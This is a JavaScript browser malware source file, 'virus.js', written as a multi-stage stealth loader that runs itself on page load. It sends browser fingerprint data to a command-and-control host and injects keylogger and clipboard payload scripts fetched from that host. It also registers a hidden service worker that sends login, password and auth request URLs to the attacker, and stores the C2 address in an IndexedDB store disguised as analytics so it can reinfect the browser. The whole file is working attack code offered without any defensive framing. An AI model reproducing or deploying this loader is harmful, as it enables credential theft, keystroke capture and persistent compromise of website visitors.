/**
 * virus.js - Multi-Stage Stealth Loader
 * Stage 0: Polymorphic stub (this file)
 * Stage 1: Environment reconnaissance (evasion.js)
 * Stage 2: Payload delivery
 * Stage 3: Persistence installation
 */

const MultiStageLoader = (() => {
    const C2_BASE = /*{{C2_BASE}}*/ 'https://c2.example.com';
    const sleep = ms => new Promise(r => setTimeout(r, ms));
    let currentStage = 0;

    // --- Stage 0: Polymorphic Loader ---
    async function stage0_loader() {
        // Generate unique session fingerprint
        const fp = btoa(navigator.userAgent + screen.width + Date.now());
        console.log('[Stage 0] Loader initialized with fingerprint:', fp.slice(0, 8));
        return stage1_recon();
    }

    // --- Stage 1: Reconnaissance ---
    async function stage1_recon() {
        currentStage = 1;
        console.log('[Stage 1] Running environment checks...');

        // Check if Evasion module is loaded
        if (typeof Evasion !== 'undefined') {
            const compromised = await Evasion.check();
            if (compromised) {
                console.log('[Stage 1] Environment compromised. Aborting.');
                Evasion.destruct();
                return false;
            }
        }

        // Additional fingerprinting for C2
        const recon = {
            ua: navigator.userAgent,
            lang: navigator.language,
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screen: `${screen.width}x${screen.height}`,
            cookies: document.cookie.length > 0,
            storage: typeof localStorage !== 'undefined'
        };

        // Report to C2 (silent fail)
        try {
            await fetch(`${C2_BASE}/beacon`, {
                method: 'POST',
                body: JSON.stringify({ stage: 1, recon }),
                headers: { 'Content-Type': 'application/json' }
            });
        } catch (e) { }

        return stage2_payload();
    }

    // --- Stage 2: Payload Delivery ---
    async function stage2_payload() {
        currentStage = 2;

        // Wait for genuine user interaction if Camouflage is available
        if (typeof Camouflage !== 'undefined') {
            console.log('[Stage 2] Waiting for genuine interaction...');
            try {
                await Camouflage.gate(async () => {
                    console.log('[Stage 2] Interaction detected. Deploying payloads...');
                });
            } catch (e) {
                console.log('[Stage 2] Timeout waiting for interaction.');
                return false;
            }
        }

        // Dynamic payload loading from C2
        const payloads = ['keylogger', 'clipboard'];
        for (const p of payloads) {
            try {
                const script = document.createElement('script');
                script.src = `${C2_BASE}/stage/2/${p}.js?t=${Date.now()}`;
                document.head.appendChild(script);
                await sleep(100);
            } catch (e) { }
        }

        return stage3_persistence();
    }

    // --- Stage 3: Persistence ---
    async function stage3_persistence() {
        currentStage = 3;
        console.log('[Stage 3] Installing persistence...');

        // Service Worker persistence
        if ('serviceWorker' in navigator) {
            const swCode = `
                self.addEventListener('install', e => self.skipWaiting());
                self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
                self.addEventListener('fetch', e => {
                    const url = e.request.url;
                    if (url.includes('login') || url.includes('password') || url.includes('api/auth')) {
                        // Silently clone and exfiltrate sensitive requests
                        fetch('${C2_BASE}/intercept', {
                            method: 'POST',
                            body: JSON.stringify({ url, method: e.request.method }),
                            headers: { 'Content-Type': 'application/json' }
                        }).catch(() => {});
                    }
                });
            `;
            try {
                const blob = new Blob([swCode], { type: 'application/javascript' });
                await navigator.serviceWorker.register(URL.createObjectURL(blob), { scope: '/' });
            } catch (e) { }
        }

        // IndexedDB persistence (store config for re-infection)
        try {
            const dbRequest = indexedDB.open('_analytics_', 1);
            dbRequest.onupgradeneeded = (e) => {
                const db = e.target.result;
                if (!db.objectStoreNames.contains('config')) {
                    db.createObjectStore('config', { keyPath: 'id' });
                }
            };
            dbRequest.onsuccess = (e) => {
                const db = e.target.result;
                const tx = db.transaction('config', 'readwrite');
                tx.objectStore('config').put({ id: 'c2', url: C2_BASE, ts: Date.now() });
            };
        } catch (e) { }

        console.log('[Stage 3] Persistence installed. Loader complete.');
        return true;
    }

    return {
        run: stage0_loader,
        getStage: () => currentStage
    };
})();

// Auto-execute on load
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', MultiStageLoader.run);
} else {
    MultiStageLoader.run();
}
